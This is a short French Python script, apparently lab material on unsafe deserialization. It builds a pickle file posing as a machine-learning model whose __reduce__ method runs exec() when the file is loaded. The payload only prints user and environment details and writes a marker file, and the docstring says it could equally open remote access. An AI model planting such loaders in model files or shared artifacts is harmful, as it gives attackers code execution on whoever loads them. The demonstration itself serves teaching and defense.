"""Fabrique modele_piege.pkl : un "modèle" qui exécute du code quand on le charge.

La charge utile est inoffensive (un message et un fichier témoin), mais elle
pourrait tout aussi bien ouvrir un accès à distance ou voler des clés.
"""
import pickle


class ModelePiege:
    def __reduce__(self):
        # pickle appellera exec(code) au chargement, avant même de rendre l'objet.
        code = (
            "import os, getpass;"
            "print('>>> Code de l attaquant exécuté en tant que', getpass.getuser(),"
            " 'dans', os.getcwd());"
            "print('>>> Variables d environnement visibles :', len(os.environ));"
            "open('PIRATE.txt', 'w', encoding='utf-8').write('Ce fichier a été créé par le modèle piégé.\\n')"
        )
        return (exec, (code,))


with open("modele_piege.pkl", "wb") as f:
    pickle.dump(ModelePiege(), f)
print("modele_piege.pkl créé - ne le chargez que dans le laboratoire.")
